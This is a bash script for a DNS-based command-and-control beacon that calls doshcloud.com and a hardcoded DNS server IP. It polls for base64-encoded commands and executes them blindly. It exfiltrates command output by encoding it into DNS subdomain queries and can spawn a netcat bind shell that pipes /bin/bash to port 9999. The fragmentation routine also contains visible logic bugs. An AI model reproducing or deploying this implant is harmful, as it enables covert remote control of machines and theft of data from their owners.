#!/bin/bash
# Beacon to DNS server 

domain="doshcloud.com"
chkdomain="check.doshcloud.com"
dnsServer="129.21.130.212"
f=false
fName=""
output=""
frag=false

# Pull down commands from server
pull(){

    cmd=$(python client.py -t T $domain)
    first=$(echo $cmd | awk '{print $1}')
    if [[ $first == "file" ]]; then
        f=true
        fName=$(echo $cmd | awk '{print $2}' | base64 --decode)
        echo $fName
    else
        cmd=$(echo $cmd | base64 --decode)
        if [[ $cmd == "shell" ]]; then
            spawn_shell &
        else
            output=$($cmd)
	        return_output
        fi
    fi
}

# return output of command back to C2 server
return_output(){
	output=$(echo $output | base64)
    arr=($output)                       # seperate into string by spaces in array
    for x in "${arr[@]}"
    do
        size=${#x}                      # get size of string
        tmp=$x
        if [[ $size -ge 255 ]]; then    # need to frag
            frag=true
        else
            python client.py $x.$domain 
        fi
        while $frag; do                 # continue fragging while size is greater equal to 255
            tmp=${x:0:255}
            python client.py $tmp.$domain
            size=${#tmp}
            if [[ $tmp -ge 255 ]]; then
                frag=true
            else
                tmp=${tmp:0:$size}
                python client.py $tmp.$domain
                frag=false
            fi
        done
    done
}

# Check in with server show beacon is still alive
check(){
    cmd=$(python client.py $chkdomain)
    if [[ $cmd == "1.1.1.1" ]]; then  # means commands are awaiting beacons
        pull
    else
        echo $cmd
    fi
}

# bind shell to a port with netcat
spawn_shell(){
    i=true
    x=0
    shell="/tmp/pipe"
    while $i; do
        if [[ -f $shell ]]; then    # current shell file exists
            shell=$shell$x          # increment file number
            let x=x+1
        else
            mkfifo /tmp/pipe                                            # make file to store nc output
            cat /tmp/pipe | /bin/bash 2>&1 | nc -l 9999 > /tmp/pipe &   # cat file to bash, pipe bash output
            i=false
        fi
    done
}

# Main driver for beacon
main(){
    while true; do
        check
        sleep 10
    done
}

main
